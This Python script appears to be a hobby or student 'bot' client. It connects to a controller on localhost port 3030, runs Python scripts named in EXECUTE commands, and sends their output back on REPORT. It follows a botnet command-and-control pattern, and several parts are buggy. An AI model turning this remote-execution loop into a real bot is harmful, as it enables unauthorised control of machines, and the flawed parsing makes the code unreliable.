#!/usr/bin/python3

from socket import *

import threading

import subprocess

import sys

serverName = 'localhost'
serverPort = 3030

sock = socket(AF_INET,SOCK_STREAM)
sock.connect((serverName,serverPort))
#sock.listen(1)
print("The bot is listening for it's commands at port{0}".format(serverPort))
ordersL=[]
outputL=[]

def buffer(sock):
    buf = ""
    while(True):
        gotten = sock.recv(1024)
        decoded = gotten.decode()
        buf += decoded
        if buf.find("\n"):
            print(str(buf))
        position = buf.find("\n")
        if(position != -1):
            message = buf[0:position + 2]
            second = buf[position + 2:]
            buf = second
            oThread = threading.Thread(target = orders, args=(sock,message))
            oThread.daemon = True
            oThread.start()


def orders(sock,message):
    pov = message.find(" ")
    route = message[0:pov]
    message = message[pov + 1:]
    if(route == "EXECUTE"):
        executing(sock,message)
    elif(route == "STOP"):
        print("Under Construction")
        PS = ("Under Construction Currently, come back soon")
        sock.send(PS.encode())
    elif(route == "REPORT"):
        reporting(sock,message)
    else:
        print("HHHMMMMMM")
    return message

def executing(sock,cutmsg):
    print("Now Executing ",cutmsg)
    
    looking = cutmsg.find(" ")
    if(looking != -1):
        print("args")
        stuff = cutmsg[0:looking]
        outputdata = subprocess.check_output(['python',stuff])
        outputdata.decode()
        print(outputdata)
        ordersL.append(stuff)
        outputL.append(outputdata)
        transmission="The script has run"
        transmission = transmission.encode()
        sock.send(transmission)
    #    cutmsg = cutmsg[looking + 1:]
    #    looking = cutmsg.find("\n")
    #    args = cutmsg[0:looking]
    else:
        print("No args")
        looking = cutmsg.find("\n")
        script = cutmsg[0:looking]
        outputdata = subprocess.check_output(['python','script'])
        print(outputdata)
    
#def stopping():
    
def reporting(sock,cutmsg):
    print("Now reporting ",cutmsg)
    looking = cutmsg.find(" ")
    stuff = cutmsg[0:looking]
    if(stuff in ordersL):
        locale = ordersL.index(stuff)
        ordersL.remove(stuff)
        transmission = outputL.pop(locale)
        sock.send(transmission)
    else:
        print("Not Present")
        transmission = "Either the script is currently running or it does not exist, try again later"
        transmission = transmission.encode()
        sock.send(transmission)
buffer(sock)
